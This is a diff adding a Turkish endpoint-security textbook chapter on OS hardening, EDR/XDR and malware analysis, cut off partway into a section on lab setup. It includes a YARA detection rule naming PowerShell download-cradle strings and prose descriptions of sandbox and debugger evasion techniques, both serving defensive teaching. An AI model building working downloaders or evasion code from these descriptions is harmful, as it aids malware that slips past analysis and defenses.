@@ -1,0 +1,547 @@
+# BÖLÜM 7: Uç Nokta Güvenliği
+
+## Giriş: Uç Noktanın Defense-in-Depth İçindeki Konumu
+
+Savunma Derinliği (Defense in Depth) mimarisinde uç nokta (endpoint) katmanı, çevre güvenliği (perimeter), ağ segmentasyonu ve kimlik katmanlarının arkasındaki "son savunma hattı" değil, modern tehdit modelinde fiilen "ilk temas noktası"dır. Phishing ile bir kullanıcı iş istasyonunda makro çalıştırıldığı, ya da bir geliştiricinin dizüstü bilgisayarında tedarik zinciri saldırısı tetiklendiği anda, çevre kontrollerinin tamamı atlanmış olur. CrowdStrike 2025 Global Threat Report'a göre 2024'te tespitlerin **%79'u dosyasızdı** (2019'da bu oran %40 idi); CrowdStrike 2026 Global Threat Report ise 2025 için bu oranı **%82'ye** yükseltmiş ve saldırganların giderek geçerli kimlik bilgileri ve güvenilir kimlik akışlarını kullandığını ("82% of detections in 2025 were malware-free as adversaries used valid credentials, trusted identity flows") belirtmiştir. Bu eğilim, uç nokta katmanının imza tabanlı AV'den davranışsal telemetri toplayan EDR/XDR'a evrilmesini zorunlu kılmıştır.
+
+Bu bölüm üç eksende ele alınmaktadır: (7.1) işletim sistemi sıkılaştırma ve EDR/XDR mimarisi, (7.2) zararlı yazılım analizi ve adli bilişim, (7.3) dosyasız saldırılar ve LotL (Living off the Land) teknikleri. Her eksen, MITRE ATT&CK teknik kimlikleriyle saldırgan mantığını ve Sysmon/SIEM tespit kurallarıyla savunma mantığını dengeli biçimde ele alır; uluslararası standartlar (NIST SP 800-53/61/86/167, CIS Controls v8, ISO 27001) ve Türkiye mevzuatı (KVKK, 5651, BDDK, CBDDO BİG Rehberi) ile ilişkilendirilir.
+
+> **Görselleştirme Önerisi (Diyagram 1):** Defense-in-Depth katman halkaları — en dışta Perimeter/Edge, ardından Network, Identity, Application, Data ve merkezde Endpoint. Uç nokta halkasının içine EPP → EDR → XDR alt katmanları yerleştirilmeli ve telemetri akışının SOC/SIEM'e doğru olduğu oklarla gösterilmelidir.
+
+---
+
+## 7.1. İşletim Sistemi Sıkılaştırma (OS Hardening) ve Uç Nokta Koruması (EDR/XDR)
+
+### 7.1.1. Windows Sıkılaştırma Mimarisi
+
+#### Group Policy Objects (GPO) ile Merkezi Politika Yönetimi
+
+Kurumsal Windows ortamlarında sıkılaştırmanın omurgası, Active Directory'ye bağlı GPO hiyerarşisidir. GPO işleme sırası **LSDOU** (Local → Site → Domain → OU) mantığıyla çalışır; çakışma durumunda OU seviyesindeki politika baskındır (en son uygulanır). Sistem mimarı açısından kritik karar, güvenlik temel çizgisinin (security baseline) nereye uygulanacağıdır. Pratikte tercih edilen mimari, Microsoft Security Compliance Toolkit baseline'larını ayrı bir "Tier 0/Tier 1/Tier 2" OU yapısına bağlamak ve sunucu ile iş istasyonu baseline'larını ayrıştırmaktır. CIS Benchmark veya DISA STIG GPO'ları bu yapıya import edilir.
+
+Modern ortamlarda saf GPO yerine **Microsoft Intune (MDM)** üzerinden Configuration Service Provider (CSP) ile politika dağıtımı, özellikle Azure AD/Entra ID'ye katılmış (joined) cihazlar için tercih edilmektedir. Hibrit ortamlarda GPO + Intune birlikte çalışırken çakışma yönetimi için "MDMWinsOverGP" ayarı belirleyicidir.
+
+> **CIS Controls v8 eşlemesi:** GPO tabanlı sıkılaştırma, **Control 4 (Secure Configuration of Enterprise Assets and Software)** ile birebir örtüşür. ISO 27001:2022 Annex A.8.9 (Configuration Management) bu kontrolün muadilidir.
+
+#### LAPS (Local Administrator Password Solution) Mimarisi
+
+Yerel yönetici parolasının tüm filoda aynı olması, pass-the-hash (T1550.002) ve yatay hareket (lateral movement, TA0008) için en yaygın istismar vektörüdür: tek bir uç noktadan elde edilen NTLM hash'i, aynı parolayı kullanan binlerce makineye erişim sağlar. **Windows LAPS** (Nisan 2023 itibarıyla işletim sistemine native entegre; Windows 10/11, Server 2019/2022/2025) bu açığı her makineye benzersiz, otomatik rotasyona tabi parola atayarak kapatır.
+
+Mimari akış: LAPS bir arka plan görevi ile saatte bir aktif politikayı işler. Parola süresi (varsayılan max yaş 7–365 gün arası ayarlanabilir) dolduğunda cihaz, politika karmaşıklık/uzunluk kurallarına uygun rastgele yeni bir parola üretir, dizinde (Windows Server AD veya Microsoft Entra ID) saklar ve yeni süre sonu zamanını hesaplar. Modern LAPS, eski sürümden farklı olarak **şifrelenmiş parola** ve **parola geçmişi** (password history) destekler; ayrıca DSRM (Directory Services Restore Mode) hesabının parolasını da yönetir.
+
+Operasyonel açıdan kritik bir özellik **post-authentication actions**'dır: bir yardım masası mühendisi LAPS parolasını çekip kullandıktan sonra parola otomatik rotasyona girer (Windows 11 24H2'de "Automatic Account Management" ile hesap adı randomizasyonu da eklenir). AD-tabanlı erişim modelinde parola okuma yetkisi ACL ile, şifre çözme yetkisi ise `ADPasswordEncryptionPrincipal` ayarı (varsayılan Domain Admins) ile ayrı ayrı kontrol edilir — bu, "parola süresi sıfırlama (nondestructive)" ile "parola okuma (sensitive)" yetkilerinin ayrıştırılmasını sağlayan iki katmanlı bir güvenlik modelidir.
+
+```powershell
+# Manuel acil rotasyon (yönetilen cihaz üzerinde)
+Reset-LapsPassword
+
+# AD'den parola okuma (yetkili IT admin)
+Get-LapsADPassword -Identity "WIN-SRV01" -AsPlainText
+
+# Felaket senaryosu: tüm DC'ler down — mounted backup DB'den kurtarma
+Get-LapsADPassword -Identity "WIN-SRV01" -Port 50000 -RecoveryMode
+```
+
+LAPS rotasyonuna ilişkin Intune olay günlükleri Event ID 10042 üretir; OS image rollback (Hyper-V snapshot geri alma) tespit edildiğinde parola uyuşmazlığını önlemek için zorunlu rotasyon tetiklenir.
+
+#### BitLocker Disk Şifreleme: TPM Entegrasyonu ve Anahtar Yönetimi
+
+BitLocker, veri-at-rest korumasını **simetrik şifreleme** (varsayılan AES-128, XTS modu) ile sağlar. Veri, **VMK (Volume Master Key)** ile şifrelenir; VMK ise birden fazla yöntemle korunabilir: TPM'den çıkarma, kullanıcı PIN'i/parolası ile çözme, veya kurtarma anahtarı (recovery key) ile çözme.
+
+TPM entegrasyonunun mimari temeli **PCR (Platform Configuration Register)** registerlarına dayanır. Boot sırasında sistem bir "güven zinciri" (chain of trust) oluşturur; her boot bileşeni (UEFI firmware, boot manager, OS loader) ölçülerek PCR'lara yazılır. TPM, yalnızca PCR durumu beklenen değerlerle eşleştiğinde VMK'yı "unseal" eder (serbest bırakır). PCR 7 Secure Boot durumunu, PCR 4 boot manager/firmware digest'ini temsil eder. Bu nedenle anakart değişimi, BIOS güncellemesi veya boot zincirinde değişiklik PCR uyuşmazlığına yol açar ve sistem kurtarma anahtarı ister — bu, "kötü amaçlı boot sektörü/rootkit" tespit mekanizmasının doğal sonucudur.
+
+> **Mimari uyarı:** TPM-only modu cold boot ve LPC bus sniffing saldırılarına açıktır; VMK, TPM'den CPU'ya açık metin olarak aktarılır. Yüksek güvenlik ortamlarında **TPM + PIN** (pre-boot authentication) zorunlu kılınmalıdır.
+
+Kurumsal anahtar yönetimi için kurtarma anahtarları AD DS'e (msFVE-RecoveryInformation öznitelikleri) veya Microsoft Entra ID'ye escrow edilir. AD entegrasyonu için şema genişletmesi (Server 2012+) ve GPO ayarı gereklidir:
+
+```
+GPO: Computer Configuration > Administrative Templates > Windows Components >
+     BitLocker Drive Encryption > Operating System Drives
+- "Require additional authentication at startup" = Enabled
+- "Configure TPM startup PIN" = Require startup PIN with TPM
+- "Store BitLocker recovery information in AD DS" = Enabled
+  (Recovery passwords and key packages)
+```
+
+```powershell
+# Kurtarma anahtarını manuel olarak AD'ye yedekleme
+manage-bde -protectors -adbackup C: -id {6CEF9111-61C2-4A09-84E1-2C0F0AAD60D2}
+```
+
+> **KVKK eşlemesi:** Disk şifreleme, KVKK Kişisel Veri Güvenliği Rehberi'nin "Şifreleme" teknik tedbiri kapsamındadır. Çalınan/kaybolan dizüstü bilgisayar bir veri ihlali oluşturduğunda, tam disk şifrelemesinin aktif olması ihlal değerlendirmesinde önemli bir hafifletici unsurdur. BDDK BSEBY md. 16 ise "personele tahsis edilen hassas veya sır kapsamındaki veri içeren masaüstü, dizüstü ve mobil cihazların içeriğinin şifrelenmesini" açıkça zorunlu kılar.
+
+> **Görselleştirme Önerisi (Diyagram 2):** BitLocker boot-time chain of trust akışı — UEFI → PCR[7] ölçümü → Boot Manager → PCR[4] → OS Loader → TPM unseal kararı → (PCR eşleşti ise VMK serbest / eşleşmedi ise Recovery Key ekranı).
+
+### 7.1.2. Linux Sıkılaştırma Mimarisi
+
+#### Sysctl ile Çekirdek/Ağ Sıkılaştırma
+
+Linux çekirdek parametreleri `/proc/sys/` altında runtime'da, kalıcı olarak ise `/etc/sysctl.d/*.conf` drop-in dosyalarıyla yönetilir. Drop-in dizin yaklaşımı (monolitik `sysctl.conf` yerine) güvenlik domainlerine göre ayrıştırma ve versiyon kontrolü açısından tercih edilir. CIS Benchmark Level 1 ile uyumlu temel ağ/çekirdek sıkılaştırması:
+
+```bash
+# /etc/sysctl.d/60-cis-hardening.conf
+# --- IP Spoofing koruması (reverse path filter, strict mode) ---
+net.ipv4.conf.all.rp_filter = 1
+net.ipv4.conf.default.rp_filter = 1
+# --- ICMP redirect reddi (MitM önleme) ---
+net.ipv4.conf.all.accept_redirects = 0
+net.ipv4.conf.all.send_redirects = 0
+net.ipv6.conf.all.accept_redirects = 0
+# --- Source routing devre dışı ---
+net.ipv4.conf.all.accept_source_route = 0
+# --- IP forwarding kapalı (router değilse) ---
+net.ipv4.ip_forward = 0
+# --- SYN flood koruması ---
+net.ipv4.tcp_syncookies = 1
+net.ipv4.tcp_max_syn_backlog = 2048
+# --- Smurf attack / broadcast ICMP ---
+net.ipv4.icmp_echo_ignore_broadcasts = 1
+net.ipv4.icmp_ignore_bogus_error_responses = 1
+# --- Martian paket loglama ---
+net.ipv4.conf.all.log_martians = 1
+# --- Bellek koruması: ASLR tam randomizasyon ---
+kernel.randomize_va_space = 2
+# --- Çekirdek pointer gizleme ---
+kernel.kptr_restrict = 2
+```
+
+```bash
+sudo sysctl --system   # tüm drop-in dosyaları uygula
+sysctl net.ipv4.conf.all.rp_filter   # doğrulama
+```
+
+`rp_filter = 1` (strict mode) gelen IP paketlerinin kaynak adresini RFC 3704'e uygun şekilde doğrular ve DDoS/spoofing saldırılarını hafifletir; varsayılan değer çoğu dağıtımda `2` (loose mode)'dur. `kernel.randomize_va_space = 2` tam ASLR (stack, heap, mmap, brk) sağlar.
+
+#### SELinux vs AppArmor: MAC Mimarileri
+
+Standart Linux izinleri **DAC (Discretionary Access Control)**'tur — dosya sahibi izinleri değiştirebilir. **MAC (Mandatory Access Control)** ise root dahi olsa süreçleri sistem genelinde kurallarla kısıtlar; bir süreç ele geçirilse bile yapabileceklerini sınırlar.
+
+**SELinux** (NSA + Red Hat kökenli; RHEL/CentOS/Fedora/Rocky varsayılanı) her nesneye (dosya, süreç, port, soket) `user:role:type:level` formatında kalıcı bir güvenlik bağlamı (context) etiketi atar. Ağır işi **Type Enforcement** mekanizması yapar. Granüler kontrol sunar ancak öğrenme eğrisi diktir; sorun gidermek için `audit.log` okumak, `audit2allow` ile özel politika modülleri üretmek gerekir.
+
+**AppArmor** (Ubuntu/Debian/SUSE varsayılanı; çekirdek 2.6.36+) ise nesne etiketleme yerine **yol tabanlı (path-based)** profiller kullanır. `/etc/apparmor.d/` altındaki düz metin profiller, bir uygulamanın hangi dizinlere/yeteneklere erişebileceğini tanımlar. Profili olmayan uygulamalar DAC'a düşer.
+
+| Özellik | SELinux | AppArmor |
+|---|---|---|
+| Model | Etiket/context tabanlı | Yol (path) tabanlı |
+| Varsayılan dağıtım | RHEL, Fedora, Rocky | Ubuntu, Debian, SUSE |
+| Modlar | enforcing / permissive / disabled | enforce / complain |
+| Yapılandırma | Karmaşık, granüler | Basit, düz metin |
+| Performans etkisi | ~%1–5 (genelde ihmal edilebilir) | ~%1–5 |
+
+Mod karşılaştırması kritik bir operasyonel karardır: **permissive (SELinux)** / **complain (AppArmor)** modu ihlalleri yalnızca **loglar ama engellemez** — bu yalnızca profil geliştirme/hata ayıklama içindir. **enforcing/enforce** modu ise gerçek korumayı sağlar; düzgün ayarlanmış politikalarla enforcing tek geçerli üretim konfigürasyonudur. Yaygın bir hata, ilk sorunda MAC'i tamamen kapatmaktır — bu privilege escalation saldırılarına kapı açar; bunun yerine permissive/complain ile debug edilmelidir.
+
+```bash
+# SELinux durum/mod
+sestatus                    # Current mode: enforcing
+setenforce 0                # geçici permissive (debug)
+grep "AVC" /var/log/audit/audit.log | tail   # denial inceleme
+audit2allow -a -M mymodule && semodule -i mymodule.pp
+
+# AppArmor durum/mod
+aa-status
+aa-complain /usr/sbin/nginx    # öğrenme modu
+aa-genprof /path/to/executable # profil üretimi (uygulamayı çalıştırarak)
+aa-enforce /usr/sbin/nginx     # enforce'a geçiş
+```
+
+> **Mimari karar (trade-off):** Aynı sistemde SELinux ve AppArmor aynı anda enforcing modda çalışamaz. Dağıtımın native MAC sistemi seçilip o mükemmelleştirilmelidir. CIS Controls v8 Control 4 ve NIST SP 800-53 AC-3/AC-6 bu MAC kontrollerini gerektirir.
+
+### 7.1.3. Yama Yönetimi (Patch Management) Mimarisi
+
+Yama yönetimi, sistem mimarı açısından bir "envanter + önceliklendirme + aşamalı dağıtım + doğrulama" döngüsüdür. CIS Controls v8 **Control 7 (Continuous Vulnerability Management)** ve **Control 2 (Inventory and Control of Software Assets)** bu döngünün temelini oluşturur.
+
+**Windows tarafı mimarisi:**
+- **WSUS:** On-prem, Microsoft Update'ten yamaları çekip dahili olarak dağıtan klasik mimari; bant genişliği tasarrufu sağlar ama bakım yükü yüksektir.
+- **SCCM/MECM (Configuration Manager):** Kurumsal ölçekte yama + uygulama + işletim sistemi dağıtımı; collection bazlı hedefleme ve maintenance window desteği.
+- **Intune:** Bulut-native; Windows Update for Business ring'leri (deployment rings) ile aşamalı dağıtım.
+
+**Linux tarafı:** `dnf-automatic` / `unattended-upgrades` ile otomasyon; Ansible/Satellite/Landscape ile filo yönetimi.
+
+**Önceliklendirme (CVSS tabanlı):** Yamalar yalnızca CVSS taban skoruna göre değil, **istismar edilebilirlik (EPSS)** ve **CISA KEV (Known Exploited Vulnerabilities)** katalogu ile birlikte önceliklendirilmelidir. CVSS 9.0+ kritik ve KEV'de yer alan zafiyetler "acil" kategorisine alınır.
+
+**Aşamalı dağıtım (test → staging → production):** Yamalar önce pilot ring'e (IT/test grubu, %1–5), sonra geniş ring'e (%25), sonunda üretime dağıtılır. Bu, KB5094127 benzeri (Windows BitLocker/PCR7 uyumsuzluğu yaratan) sorunlu güncellemelerin tüm filoyu kilitlemesini önler.
+
+> **Türkiye mevzuatı:** KVKK Kişisel Veri Güvenliği Rehberi açıkça "ağ ortamında kullanılan cihazların ve/veya programların yama yönetimi-yazılım güncellemelerinin olup olmadığının... düzenli olarak kontrol edilmesi" gerektiğini belirtir. BDDK BSEBY ise bankalar için "güvenlik açıklarını hızla giderecek güvenlik açıkları ve yama yönetimi süreci" tesisini zorunlu kılar.
+
+### 7.1.4. Uygulama Beyaz Listeye Alma (Application Whitelisting)
+
+Beyaz listeleme, geleneksel "kötü olanı engelle" (blacklist) modelini tersine çevirip "yalnızca onaylananı çalıştır" (allowlist) modeline geçer. NIST SP 800-167 (Guide to Application Whitelisting, Ekim 2015) bu yaklaşımın referans dokümanıdır ve "merkezi yönetilen, tutarlı uygulama yüküne sahip host'larda" en pratik olduğunu belirtir.
+
+**WDAC (Windows Defender Application Control) vs AppLocker:**
+
+| Özellik | AppLocker | WDAC |
+|---|---|---|
+| Tanıtım | Windows 8 | Windows 10 / Server 2016 |
+| Çalışma modu | Kullanıcı modu | Kernel + kullanıcı modu |
+| Kernel-mode driver kontrolü | Yok | Var |
+| Kapsam | Kullanıcı/grup bazlı (per-user) | Cihaz-merkezli (per-device) |
+| Dosya tanımlama | Sertifika subject name | Sertifika thumbprint |
+| Hata riski | Yanlış kural → bazı süreçler çalışmaz | Yanlış kural → Windows boot olmayabilir (re-image gerekir) |
+| Bakım kolaylığı | XML elle düzenlenebilir, kolay | XML elle düzenlemek pratik değil |
+
+WDAC, "Device Guard"ın halefidir ve XML şema (SiPolicy.xsd) ile tanımlanır: `PolicyInfo`, `Rules` (audit mode, script enforcement), `Signers` (güvenilir sertifika/yayıncı, EKU kısıtları), `FileRules` (hash/path), `SigningScenarios` (user-mode/kernel-mode ayrı kural setleri). Üç şablon politika sunar: Default Windows Mode (en kısıtlayıcı), Allow Microsoft Mode, Signed and Reputable Mode (Intelligent Security Graph entegrasyonu).
+
+WDAC olayları **CodeIntegrity/Operational** günlüğüne yazılır: Event ID 3076 (audit modu ihlali), 3077 (enforcement bloğu), 3089 (politika aktivasyonu).
+
+**Mimari karar:** Microsoft, WDAC'ı tercih etmeyi önerir (AppLocker artık yeni özellik almıyor, yalnızca güvenlik düzeltmeleri alıyor). Ancak WDAC'ın yüksek başlangıç maliyeti vardır — kırılgan hash kuralları yerine **publisher (yayıncı) tabanlı kurallar** ve **managed installer / ISG** kullanımı, uygulama güncellemelerinde politika kırılmasını dramatik biçimde azaltır. WDAC, AV'nin yerini almaz; ASR kuralları (Attack Surface Reduction) ile birlikte katmanlı savunma oluşturur.
+
+**Linux tarafı — fapolicyd:** RHEL'de `fapolicyd` (File Access Policy Daemon) uygulama beyaz listeleme sağlar; güvenilir veritabanı (RPM DB) dışındaki binary'lerin çalıştırılmasını engeller.
+
+> **CIS Controls v8 eşlemesi:** Application allowlisting, **Control 2 (Inventory and Control of Software Assets)**'in 2.5–2.7 alt kontrolleriyle (allowlisting of authorized software/libraries/scripts) doğrudan örtüşür. NIST SP 800-53 CM-7(5) (whitelisting) muadildir. BDDK BSEBY md. 16/(2) bankalar için açıkça **beyaz liste** uygulamasını ve beyaz listedeki çalıştırılabilir/kütüphane dosyalarının **dosya bütünlük kontrol araçları** ile değiştirilip değiştirilmediğinin kontrolünü zorunlu tutar.
+
+### 7.1.5. EPP → EDR → XDR Mimari Evrimi
+
+Üç katmanı sistem mimarı gözüyle ayırt etmek gerekir:
+
+- **EPP (Endpoint Protection Platform):** Önleyici (preventive) katman. İmza tabanlı AV + NGAV (makine öğrenmesi/davranışsal sezgisel ile zero-day, fileless, polimorfik tespiti) + firewall + cihaz şifreleme. "Bilinen kötüyü çalışmadan engelle." Olay hacmini azaltır.
+- **EDR (Endpoint Detection and Response):** Tespit + müdahale katmanı. EPP'nin kaçırdığını yakalar; sürekli telemetri toplar, MITRE ATT&CK ile korelasyon yapar, araştırma zaman çizelgeleri (timeline) ve post-compromise aksiyonlar (host izolasyonu, süreç sonlandırma) sağlar. "Reaktif, telemetri-zengin."
+- **XDR (Extended Detection and Response):** EDR mantığını dışa genişletir; uç nokta + ağ + bulut + e-posta + kimlik telemetrisini **tek bir korelasyon motorunda** birleştirir. Katmanlar arası hareket eden bir saldırıyı beş kopuk alarm yerine tek bir hikaye (incident) olarak gösterir; analist bağlam değiştirmesini (context-switching) ve alarm yorgunluğunu (alert fatigue) azaltır.
+
+**Veri akışı ve korelasyon mimarisi:** EDR, tek uç noktadan veri toplar ve tekil host bazında korele eder. XDR, çoklu kaynaktan (EDR + NDR + UEBA + SIEM + e-posta/identity sensörleri) veri toplar; merkezi korelasyon motoru olayları birbirine bağlar. Örnek senaryo: bir makinede LSASS'tan kimlik bilgisi dump edilir (T1003.001), aynı kimlik başka bir makineye login için kullanılır ve orada kötücül davranış gözlenir — XDR'ın merkezi korelasyon motoru bu noktaları birleştirip saldırı zincirinin grafik gösterimini sunar.
+
+> **SOC entegrasyonu:** EDR/XDR, SIEM'e alarm + ham telemetri besler; SOAR ile otomatik müdahale (containment) tetiklenir. Bağımsız etkinlik referansları için MITRE ATT&CK Evaluations ve AV-Comparatives raporları vendor iddialarına bağlı kalmadan değerlendirme sağlar.
+
+> **Görselleştirme Önerisi (Diyagram 3):** EDR/XDR veri akış mimarisi — Endpoint agent → telemetri (process, file, registry, network, image load) → cloud/manager → korelasyon motoru → SIEM/SOC dashboard. XDR'da yan kanallardan (email, identity, cloud, NDR) gelen oklar aynı korelasyon motoruna girmeli.
+
+### 7.1.6. Davranışsal Analiz ve Bellek Koruma Teknikleri
+
+Modern EPP/EDR, imzaya ek olarak işletim sisteminin yerleşik bellek koruma mekanizmalarını da yönetir:
+
+- **DEP (Data Execution Prevention):** NX (No-Execute) bit kullanarak veri sayfalarının (heap, stack) kod olarak çalıştırılmasını engeller; buffer overflow shellcode'unu durdurur. x64/ARM/ARM64 executable'larda her zaman açık, kapatılamaz.
+- **ASLR (Address Space Layout Randomization):** Executable taban adresini, stack/heap/kütüphane konumlarını rastgeleleştirir; return-to-libc/ROP saldırılarını zorlaştırır. Bottom-up ASLR varsayılan açık; **Mandatory ASLR (ForceRelocateImages)** varsayılan kapalı (bazı eski uygulamaları bozabilir).
+- **CFG (Control Flow Guard):** Dolaylı (indirect) çağrılarda kontrol akışı bütünlüğü sağlar; per-process bitmap ile her indirect call'un geçerli bir hedefe gittiğini doğrular. ROP/JOP saldırılarını zorlaştırır. `/guard:cf` linker bayrağı ile derlenmiş binary'lerde çalışır; audit modu yoktur.
+- **SEHOP, Heap Integrity, ACG (Arbitrary Code Guard), CIG (Code Integrity Guard):** Ek mitigasyonlar.
+
+Bunlar **Windows Defender Exploit Guard / Exploit Protection** altında sistem ve uygulama seviyesinde yönetilir (EMET'in halefi):
+
+```powershell
+# Sistem geneli mitigasyon durumu
+Get-ProcessMitigation -System
+# Sistem seviyesi mitigasyonları etkinleştirme
+Set-ProcessMitigation -System -Enable DEP,SEHOP,ForceRelocateImages,BottomUp,HighEntropy
+# Boot seviyesi DEP
+bcdedit /set nx AlwaysOn
+```
+
+GPO ile: `Computer Configuration > Administrative Templates > Windows Components > Windows Defender Exploit Guard > Exploit Protection > "Use a common set of exploit protection settings"` → ağ paylaşımındaki XML'i işaret eder. Uygulama çökme/uyumsuzluğu için Event ID 1000/1001 (crash) ve 1002 (hang) izlenmelidir; deploy öncesi audit modu kullanılmalıdır.
+
+> **CBDDO BİG Rehberi eşlemesi:** Rehberin **3.1.5.5 maddesi "İşletim Sistemlerinin Güvenlik Mekanizmalarının Etkinleştirilmesi"** başlığıyla bu bellek koruma mekanizmalarının açık tutulmasını gerektirir.
+
+### 7.1.7. Somut Araçlar: Wazuh, CrowdStrike, Defender, SentinelOne
+
+**Wazuh (açık kaynak XDR/SIEM):** Dört bileşenli dağıtık mimari: **agent** (uç nokta), **server/manager** (analiz motoru), **indexer** (OpenSearch tabanlı arama/depolama), **dashboard**. Agent modülerdir: Log collector, FIM (File Integrity Monitoring — who/what/when), SCA (Security Configuration Assessment — CIS Benchmark tabanlı), System inventory, Malware detection (imza-dışı/rootkit), Active Response. Veri akışı: agent → server (1514/TCP) → analiz (decoder + rule) → indexer (9200) → dashboard (REST API 55000). Filebeat alarmları indexer'a taşır.
+
+```xml
+<!-- Wazuh Active Response örneği: SSH brute-force IP bloklama -->
+<command>
+  <name>firewall-drop</name>
+  <executable>firewall-drop</executable>
+  <timeout_allowed>yes</timeout_allowed>
+</command>
+<active-response>
+  <command>firewall-drop</command>
+  <location>local</location>
+  <rules_id>5710,5711</rules_id>
+  <timeout>600</timeout>   <!-- 600 sn sonra otomatik unblock (stateful) -->
+</active-response>
+```
+
+Wazuh agent, FIM + YARA + VirusTotal/CDB entegrasyonu ile zararlı dosya tespiti yapar; tek başına FIM malware tespit edemez, tehdit kuralları ile birleştirilmelidir. EPS performansı tipik SOC yükünde ~500 EPS'e kadar doğrusal; olayların %95'i 500 ms altında işlenir. MITRE ATT&CK ve PCI DSS/HIPAA/GDPR/NIST 800-53 uyum eşlemeleri hazır gelir.
+
+**CrowdStrike Falcon:** Bulut-native tek hafif agent; çekirdek seviyesi sensör ile davranışsal IOA (Indicators of Attack) tespiti. Threat Graph ile korelasyon.
+
+**Microsoft Defender for Endpoint:** Windows'a entegre; ASR kuralları, Exploit Protection, Advanced Hunting (KQL), Intune/WDAC entegrasyonu.
+
+**SentinelOne:** EPP+EDR tek agent; davranışsal AI motoru, Storyline ile otomatik olay rekonstrüksiyonu, ransomware rollback.
+
+> **Mimari değerlendirme:** Açık kaynak Wazuh, lisans maliyeti sıfır ancak ölçeklendirme (500+ EPS, çok-node indexer/server cluster) ve özel konfigürasyon için yüksek uzmanlık gerektirir; bu, en büyük TCO çarpanıdır. Ticari EDR'ler (Falcon, Defender, SentinelOne) yönetilen telemetri ve hazır tespit içeriği sunar.
+
+---
+
+## 7.2. Zararlı Yazılım Analizi ve Uç Nokta Adli Bilişimi (Forensics/KAPE)
+
+### 7.2.1. Statik ve Dinamik Analiz Metodolojileri
+
+**Statik analiz** (örnek çalıştırılmadan):
+- **Hash analizi:** MD5/SHA-256 → VirusTotal/threat intel sorgusu (T1027 obfuscation tespiti için ilk adım).
+- **String analizi:** `strings` ile gömülü URL, IP, mutex, registry yolu, API isimleri çıkarımı.
+- **PE header analizi:** Import Address Table (IAT), section'lar (yüksek entropi → packing/encryption işareti), compile timestamp, imzalama bilgisi.
+- **Disassembly:** IDA Pro / Ghidra / radare2 ile assembly seviyesinde mantık çözümleme.
+- **YARA kuralları:** İmza/desen tabanlı sınıflandırma.
+
+```yara
+rule Suspicious_PowerShell_Downloader {
+    meta:
+        author = "SOC Team"
+        description = "Fileless downloader cradle tespiti"
+        mitre = "T1059.001, T1105"
+    strings:
+        $s1 = "IEX" nocase
+        $s2 = "New-Object Net.WebClient" nocase
+        $s3 = "DownloadString" nocase
+        $s4 = "FromBase64String" nocase
+    condition:
+        2 of ($s*)
+}
+```
+
+**Dinamik analiz** (izole sandbox'ta çalıştırarak):
+- **Davranış izleme:** Süreç ağacı, dosya/registry değişiklikleri, ağ trafiği (C2 beacon).
+- **API/syscall monitoring:** API Monitor, Process Monitor (ProcMon), frida ile çağrı yakalama.
+- **Sandbox:** Cuckoo/CAPE, ANY.RUN, Joe Sandbox.
+
+### 7.2.2. Sandbox Atlatma (Evasion) Teknikleri
+
+Picus Labs Red Report 2026 (10 Şubat 2026; 1.084.718 zararlı örnek ve 15,5 milyon ATT&CK eyleminin analizi), **T1497 Virtualization/Sandbox Evasion** tekniğinin son iki yıl Top 10 dışında kaldıktan sonra analiz edilen örneklerin **%20'sinde (her 5 örnekten 1'inde)** görülerek **#4 en yaygın teknik** haline geldiğini ("Virtualization/Sandbox Evasion has surged to become the #4 most prevalent technique") raporlamıştır. Saldırgan mantığı:
+
+- **VM/sandbox tespiti:** Hipervizöre özgü artefaktlar — registry anahtarları, dosyalar, servisler, süreç isimleri (`VBoxGuest`, `vmtoolsd.exe`, `vm3dservice`, `vboxservice`). Düşük CPU çekirdek sayısı (<4), düşük ekran çözünürlüğü, küçük disk.
+- **Zaman gecikmeli (time-delay):** Uzun `Sleep` çağrıları ile sandbox'ın kısa analiz penceresini (timeout) aşma; GootLoader bu tekniği kullanır. `GetTickCount`, `RDTSC` ile hızlandırılmış zaman tespiti; "time bomb" (`GetLocalTime` ile belirli tarih sonrası çalışma).
+- **Kullanıcı etkileşimi kontrolü:** Picus Red Report 2026'da analiz edilen LummaC2 v4.0 (BleepingComputer, Kasım 2025), `GetCursorPos()` ile 50 ms aralıkla 5 ardışık imleç konumunu (P0–P4) kaydedip aralarındaki **Öklid mesafesi ve açıları trigonometriyle** hesaplayarak insan varlığını doğrular; düz/yapay hareketler sandbox işaretidir. Picus Blue Report 2025'e göre T1497 yalnızca **%13 oranında engellenebilmektedir** — yani savunma açısından en zorlu tekniklerden biridir.
+- **Anti-debugging:** `IsDebuggerPresent`, `CheckRemoteDebuggerPresent` (PEB `BeingDebugged` alanını okur); debugger tespitinde malware kendini imha eder veya davranışını maskeler.
+
+**Savunma (analist) karşı tedbirleri:** FakeNet ile gerçekçi ağ simülasyonu, VBoxCloak/VMwareCloak ile sanallaştırma izlerini gizleme, IDA/x64dbg ile kritik instruction'ları atlama (patching), bare-metal sandbox kullanımı (en şeffaf ama en pahalı), instruction-level emülasyon.
+
+### 7.2.3. Polimorfik ve Metamorfik Zararlı Yazılımlar
+
+- **Polimorfik malware:** Çekirdek (payload) kodu sabit kalır ancak her enfeksiyonda farklı bir şifreleme anahtarı/decryptor ile kendini şifreler; imza tabanlı tespiti atlatır ama bellekte deşifre edildiğinde davranışsal/bellek analizi ile yakalanır.
+- **Metamorfik malware:** Kendi kodunu her nesilde tamamen yeniden yazar (instruction substitution, register reassignment, NOP insertion, kod permütasyonu); decryptor bile değişir, bu nedenle statik imza neredeyse imkansızdır. Tespit, davranışsal ve emülasyon tabanlı analize bağımlıdır.
+
+Bu, EPP'den EDR/XDR'a geçişin temel gerekçesidir: davranış değişmez, kod değişir. Picus Red Report 2026 bu gerekliliği niceliksel olarak da doğrular — Process Injection (T1055) üçüncü yıl üst üste analiz edilen örneklerin **%30'unda** görülerek en yaygın teknik olmuş, Top 10 tekniğin **%80'i** savunma atlatma, kalıcılık ve gizli C2 kategorilerine ayrılmıştır. Bu, "dosya avlama" (hunting files) yerine "davranış avlama" (hunting behavior) yaklaşımının zorunluluğunu ortaya koyar.
+
+### 7.2.4. İzole Laboratuvar (Malware Analysis Lab) Kurulum Stratejisi
+
+Sistem mimarı açısından bir malware lab'ının ana tasarım prensibi **network izolasyonudur** — örneğin C2'ye sızma veya yanlışlıkla yayılma (lateral spread) riskini sıfırlamak.
+
+**Mimari katmanlar:**
+- **Sanallaştırma:** Proxmox (KVM tabanlı, açık kaynak) veya VMware ESXi/Workstation. Host-only / internal network ile fiziksel ağdan tam izolasyon.
